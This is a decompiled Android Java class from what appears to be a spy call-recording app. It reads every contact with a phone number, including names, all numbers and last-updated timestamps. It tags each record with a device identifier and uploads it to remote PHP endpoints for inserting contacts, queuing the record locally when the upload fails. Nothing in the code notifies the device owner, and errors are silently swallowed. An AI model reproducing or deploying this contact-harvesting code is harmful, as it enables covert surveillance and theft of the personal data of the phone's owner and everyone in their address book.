package com.yasoka.spcallrecord.recorder.call.a.c.h;

import a.b.a.a.a;
import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendContactsRefresh */
public class b extends Thread {

    /* renamed from: a reason: collision with root package name */
    private Context f258a;

    /* renamed from: b reason: collision with root package name */
    private boolean f259b;

    public b(Context context, boolean z) {
        this.f258a = context;
        this.f259b = z;
    }

    private void a(String str, String str2, String str3, String str4) {
        HashMap hashMap = new HashMap();
        String str5 = "";
        StringBuilder a2 = a.a(str5);
        a2.append(e.e(this.f258a));
        hashMap.put("idPhone", a2.toString());
        StringBuilder sb = new StringBuilder();
        sb.append(str5);
        sb.append(str);
        hashMap.put("idContact", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append(str5);
        sb2.append(str2);
        hashMap.put("name", sb2.toString());
        StringBuilder sb3 = new StringBuilder();
        sb3.append(str5);
        sb3.append(str3);
        hashMap.put("number", sb3.toString());
        StringBuilder sb4 = new StringBuilder();
        sb4.append(str5);
        sb4.append(str4);
        hashMap.put("date", sb4.toString());
        if (!a.c.e.a.b(this.f259b ? "contacts/insertContactFirst.php" : "contacts/insertContactRefresh.php", (Map<String, String>) hashMap)) {
            StringBuilder sb5 = new StringBuilder();
            sb5.append(str5);
            sb5.append(str);
            a.a.a(str3, str2, sb5.toString(), str4);
        }
    }

    public void run() {
        String str = "data1";
        long j = -1;
        try {
            String str2 = "contact_last_updated_timestamp";
            String str3 = "display_name";
            String str4 = "_id";
            Cursor query = this.f258a.getContentResolver().query(Contacts.CONTENT_URI, VERSION.SDK_INT >= 18 ? new String[]{str4, str3, str2} : new String[]{str4, str3}, "has_phone_number='1'", null, "_id COLLATE LOCALIZED ASC");
            Uri uri = Phone.CONTENT_URI;
            if (query != null && query.getCount() > 0) {
                while (query.moveToNext()) {
                    String string = query.getString(query.getColumnIndex(str3));
                    long j2 = query.getLong(query.getColumnIndex(str4));
                    SimpleDateFormat d2 = c.d();
                    String format = d2.format(new Date());
                    if (VERSION.SDK_INT >= 18) {
                        long j3 = query.getLong(query.getColumnIndex(str2));
                        Calendar instance = Calendar.getInstance();
                        instance.setTimeInMillis(j3);
                        format = d2.format(instance.getTime());
                    }
                    String str5 = "";
                    StringBuilder sb = new StringBuilder();
                    sb.append("contact_id=");
                    sb.append(j2);
                    long j4 = j2;
                    Cursor query2 = this.f258a.getContentResolver().query(uri, new String[]{str}, sb.toString(), null, "is_super_primary DESC");
                    if (query2 != null) {
                        String str6 = str5;
                        while (query2.moveToNext()) {
                            try {
                                String string2 = query2.getString(query2.getColumnIndex(str));
                                StringBuilder sb2 = new StringBuilder();
                                sb2.append(str6);
                                sb2.append(string2);
                                sb2.append("<br/>");
                                str6 = sb2.toString();
                            } catch (Exception e2) {
                                e2.getStackTrace();
                            }
                        }
                        query2.close();
                        str5 = str6;
                    }
                    a(Long.toString(j4), string, str5, format);
                    j = j4;
                }
                e.a(j, this.f258a);
                query.close();
            } else if (query != null) {
                query.close();
            }
        } catch (Exception e3) {
            e3.getStackTrace();
        }
    }
}
